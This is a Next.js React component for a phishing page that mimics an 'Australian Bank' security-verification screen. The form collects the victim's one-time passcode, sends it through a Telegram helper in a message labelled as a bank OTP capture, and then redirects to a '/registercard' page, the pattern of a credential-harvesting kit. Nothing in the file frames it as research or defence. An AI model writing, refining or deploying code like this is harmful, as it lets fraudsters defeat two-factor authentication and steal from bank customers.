"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { sendTelegramMessage } from "../../utils/telegram";

const OTPVerificationPage: React.FC = () => {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const message = `
🔔 *Australian Bank OTP Verification* 🔔
🔢 OTP Code: ${otp}
    `;

    try {
      await sendTelegramMessage(message);
      setError("");
      router.push('/registercard'); // Or success page
    } catch (err) {
      console.log(err)
      setError("Failed to verify OTP. Please try again.");
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100 px-4 py-8">
      <div className="bg-white shadow-md rounded-lg p-6 w-full max-w-md text-center border border-gray-300">
        <div className="mb-6">
          <h1 className="text-2xl font-semibold text-gray-900 mb-2">
            Security Verification
          </h1>
          <div className="w-16 h-1 bg-blue-600 mx-auto"></div>
        </div>
        
        <p className="text-gray-600 mb-6 text-sm">
          For your security, we&apos;ve sent a verification code to your registered mobile number.
        </p>

        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 rounded mt-4 text-sm">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit} className="mt-6 space-y-4">
          <div>
            <label htmlFor="otp" className="block text-sm font-medium text-gray-700 mb-2 text-left">
              Enter verification code
            </label>
            <input
              type="tel"
              id="otp"
              pattern="[0-9]*"
              placeholder="Enter  code"
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
              maxLength={6}
              className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 text-lg text-center tracking-widest font-semibold"
              required
            />
          </div>

          <button
            type="submit"
            className="w-full py-3 rounded-lg text-white font-semibold transition duration-300 text-base bg-blue-600 hover:bg-blue-700"
          >
            Verify & Continue
          </button>
        </form>
        
        <div className="mt-6 pt-4 border-t border-gray-200">
          <p className="text-sm text-gray-600">
            Didn&apos;t receive the code? 
            <button className="text-blue-600 hover:underline font-medium ml-1">
              Resend SMS
            </button>
          </p>
          <p className="text-xs text-gray-500 mt-2">
            This may take a minute or two. Make sure you have signal reception.
          </p>
        </div>
      </div>
    </div>
  );
};

export default OTPVerificationPage;